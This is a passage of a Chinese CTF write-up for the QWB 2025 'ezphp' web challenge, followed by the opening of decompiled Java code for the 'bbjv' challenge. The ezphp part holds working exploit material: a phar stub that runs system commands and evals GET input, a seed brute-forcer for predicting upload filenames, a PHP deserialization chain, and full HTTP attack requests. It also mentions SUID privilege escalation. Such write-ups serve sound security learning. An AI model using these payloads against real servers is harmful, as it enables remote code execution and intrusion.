</span></span></code></pre></td></tr></table></div></div><p>但是如何调用到 test.readflag.readflag 呢</p><p><a class=link href=https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html target=_blank rel=noopener>https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html</a></p><p>保存base64解码后的文件为 test.php，用同款插件分析</p><p><img src=/p/qwb-2025/4.png width=1346 height=1635 loading=lazy alt=img></p><p>本地可以用 <code>%00readflag%2Fhome%2Fmingzu%2FCTF%2Fqwb%2Fezphp%2Ftest.php%3A59%241</code> 执行 <code>readflag</code></p><p>测试后可从远程环境报错得知 eval 之后的路径是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=n>php</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>:</span> <span class=n>eval</span><span class=p>()</span><span class=s1>&#39;d code</span>
</span></span></code></pre></td></tr></table></div></div><p>且行号是 1</p><p>所以远程可以通过</p><p><code>%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241</code> 执行 readflag</p><p>$后面的数字会自增，但是没测出自增的规律，所以猜不到了就重启靶机</p><p>然后打include phar</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s1>&#39;exp.phar&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$stub</span> <span class=o>=</span> <span class=s>&lt;&lt;&lt;&#39;</span><span class=dl>STUB</span><span class=s>&#39;
</span></span></span><span class=line><span class=cl><span class=s>&lt;?php
</span></span></span><span class=line><span class=cl><span class=s>    print 123;
</span></span></span><span class=line><span class=cl><span class=s>    system(&#39;cat /flag&#39;);
</span></span></span><span class=line><span class=cl><span class=s>    system(&#39;/readflag&#39;);
</span></span></span><span class=line><span class=cl><span class=s>    eval($_GET[1]);
</span></span></span><span class=line><span class=cl><span class=s>    __HALT_COMPILER();
</span></span></span><span class=line><span class=cl><span class=s>?&gt;
</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>STUB</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=nv>$stub</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s1>&#39;test.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;test&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/qwb-2025/5.png width=2351 height=411 loading=lazy alt=img></p><p>但是上传之后文件名会被重命名，include 去包含 .phar.gz 类文件必须有 phar 字符串的出现，测试后发现 <code>xxxx.pharxxxx.jpg</code> 在 include 时会被正确加载</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$time</span> <span class=o>=</span> <span class=nx>date</span><span class=p>(</span><span class=s1>&#39;Hi&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$GLOBALS</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$seed</span> <span class=o>=</span> <span class=nv>$time</span> <span class=o>.</span> <span class=nx>intval</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>mt_srand</span><span class=p>(</span><span class=nv>$seed</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$randomStr</span> <span class=o>=</span> <span class=nx>generateRandomString</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>所以我们需要控制文件名，由于种子可以预测文件名，所以可以爆破出小时分钟+某个数字的seed，让 generateRandomString 函数输出的前四个是phar</p><p>然后将这个种子后缀，也就是我们想要的 $filename 的值，放到 test 实例的 readflag 成员变量中，使得反序列化时全局变量 filename 的值为这个数字</p><p>此时触发 upload，则计算出的 file 变量的值就是xxxx.pharxxxx.png</p><p>再去调用 readflag 函数，这样就可以触发 phar</p><p>但是这种情况下在一分钟内有效，反序列化的 exp 如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>date_default_timezone_set</span><span class=p>(</span><span class=s1>&#39;Asia/Shanghai&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>generateRandomString</span><span class=p>(</span><span class=nv>$length</span> <span class=o>=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$characters</span> <span class=o>=</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nv>$randomString</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$length</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$r</span> <span class=o>=</span> <span class=nx>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$characters</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// echo $r . &#34; &#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$randomString</span> <span class=o>.=</span> <span class=nv>$characters</span><span class=p>[</span><span class=nv>$r</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nv>$randomString</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>brute</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$time</span> <span class=o>=</span> <span class=nx>date</span><span class=p>(</span><span class=s1>&#39;Hi&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nv>$t</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$t</span><span class=o>&lt;=</span><span class=mi>10000000</span><span class=p>;</span> <span class=nv>$t</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nv>$seed</span> <span class=o>=</span> <span class=nv>$time</span> <span class=o>.</span> <span class=nv>$t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nx>mt_srand</span><span class=p>(</span><span class=nv>$seed</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nv>$x</span> <span class=o>=</span> <span class=nx>generateRandomString</span><span class=p>(</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=c1>// echo $seed . &#34; &#34; . $x . &#34;\n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span> <span class=p>(</span><span class=nv>$x</span> <span class=o>==</span> <span class=s2>&#34;phar&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>mt_srand</span><span class=p>(</span><span class=nv>$seed</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$t</span> <span class=o>.</span> <span class=s2>&#34; &#34;</span> <span class=o>.</span> <span class=nv>$seed</span> <span class=o>.</span> <span class=s2>&#34; &#34;</span> <span class=o>.</span> <span class=nx>generateRandomString</span><span class=p>()</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>test</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$readflag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$absolute_path</span> <span class=o>=</span> <span class=s2>&#34;/var/www/html/index.php(1) : eval()&#39;d code&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$line_number</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// $absolute_path = &#34;/var/www/html/test.php&#34;;
</span></span></span><span class=line><span class=cl><span class=c1>// $line_number = 61;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$internal_func_name</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\0</span><span class=s2>readflag&#34;</span> <span class=o>.</span> <span class=nv>$absolute_path</span> <span class=o>.</span> <span class=s2>&#34;:&#34;</span> <span class=o>.</span> <span class=nv>$line_number</span> <span class=o>.</span> <span class=s2>&#34;$1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>//echo urlencode($internal_func_name) . &#34;\n&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$x</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>test</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$x</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>=</span> <span class=s2>&#34;class&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$x</span><span class=o>-&gt;</span><span class=na>f</span> <span class=o>=</span> <span class=s2>&#34;test&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$x</span><span class=o>-&gt;</span><span class=na>readflag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span> <span class=o>.</span> <span class=nx>brute</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$y</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>test</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$y</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>=</span> <span class=s2>&#34;func&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$y</span><span class=o>-&gt;</span><span class=na>f</span> <span class=o>=</span> <span class=nv>$internal_func_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$y</span><span class=o>-&gt;</span><span class=na>readflag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$z</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>test</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$z</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>=</span> <span class=s2>&#34;none&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$z</span><span class=o>-&gt;</span><span class=na>f</span> <span class=o>=</span> <span class=nv>$y</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$z</span><span class=o>-&gt;</span><span class=na>readflag</span> <span class=o>=</span> <span class=nv>$x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$z</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$payload</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nv>$payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$payload</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>构造的思路是，先 upload 然后 readflag</p><p>upload 只能由 __construct 触发，所以 $x 这个实例是固定的，因为在执行 <code>new test()</code> 之前 <code>$GLOBALS['filename']</code> 的值会被 $this->readflag 这个成员变量覆盖，所以 $x 的 readflag 只能是爆破出的种子后缀</p><p>$y 的构造思路也很简单，就是使用 <code>\0</code> 开头的函数名直接执行位于第一行的函数 readflag，实现文件包含</p><p><code>class</code> 和 <code>func</code> 两个功能的调用都是依赖于 test 类的 __destruct，所以需要另外一个实例来调一下这两个的触发顺序，先反序列化的会后销毁，所以将 $y 放在 $x 前面，就能使得 $x 对应的 upload 先触发，$y 对应的 readflag 后触发，上传的时候就要触发</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/index.php?land=O%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A6%3A%22510868%22%3Bs%3A1%3A%22f%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22key%22%3Bs%3A5%3A%22class%22%3B%7Ds%3A1%3A%22f%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A0%3A%22%22%3Bs%3A1%3A%22f%22%3Bs%3A55%3A%22%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7Ds%3A3%3A%22key%22%3Bs%3A4%3A%22none%22%3B%7D&amp;1=phpinfo();</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l> </span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundaryMvFc5zDkBcoa1yiL</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>138</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundaryMvFc5zDkBcoa1yiL
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;119738&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{{file:line(C:\Users\baozhongqi\Desktop\final.phar.gz)}}
</span></span><span class=line><span class=cl>------WebKitFormBoundaryMvFc5zDkBcoa1yiL--
</span></span></code></pre></td></tr></table></div></div><p>读取 /flag 不成功，suid 提权即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/index.php?land=O%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A6%3A%22295468%22%3Bs%3A1%3A%22f%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22key%22%3Bs%3A5%3A%22class%22%3B%7Ds%3A1%3A%22f%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A0%3A%22%22%3Bs%3A1%3A%22f%22%3Bs%3A55%3A%22%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7Ds%3A3%3A%22key%22%3Bs%3A4%3A%22none%22%3B%7D&amp;1=system(&#34;ls+%2F%3Bbase64+%27%2Fflag%27+%7C+base64+--decode&#34;);</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l> </span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundaryMvFc5zDkBcoa1yiL</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>138</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundaryMvFc5zDkBcoa1yiL
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;295468&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{{file:line(C:\Users\baozhongqi\Desktop\final.phar.gz)}}
</span></span><span class=line><span class=cl>------WebKitFormBoundaryMvFc5zDkBcoa1yiL--
</span></span></code></pre></td></tr></table></div></div><p>挺复杂的一道题，几乎是和队友做了整整24小时</p><h2 id=bbjv>bbjv</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.ctf.gateway.controller</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.ctf.gateway.service.EvaluationService</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.BufferedReader</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.File</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileNotFoundException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileReader</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.GetMapping</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.RequestParam</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.RestController</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@RestController</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/controller/GatewayController.class */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>GatewayController</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>EvaluationService</span><span class=w> </span><span class=n>evaluationService</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>GatewayController</span><span class=p>(</span><span class=n>EvaluationService</span><span class=w> </span><span class=n>evaluationService</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>evaluationService</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>evaluationService</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>({</span><span class=s>&#34;/check&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>checkRule</span><span class=p>(</span><span class=nd>@RequestParam</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>rule</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>FileNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>evaluationService</span><span class=p>.</span><span class=na>evaluate</span><span class=p>(</span><span class=n>rule</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>File</span><span class=w> </span><span class=n>flagFile</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>System</span><span class=p>.</span><span class=na>getProperty</span><span class=p>(</span><span class=s>&#34;user.home&#34;</span><span class=p>),</span><span class=w> </span><span class=s>&#34;flag.txt&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>flagFile</span><span class=p>.</span><span class=na>exists</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>br</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileReader</span><span class=p>(</span><span class=n>flagFile</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>String</span><span class=w> </span><span class=n>content</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>br</span><span class=p>.</span><span class=na>readLine</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&lt;br&gt;&lt;b&gt;�� Flag:&lt;/b&gt; &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>content</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>br</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>finally</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
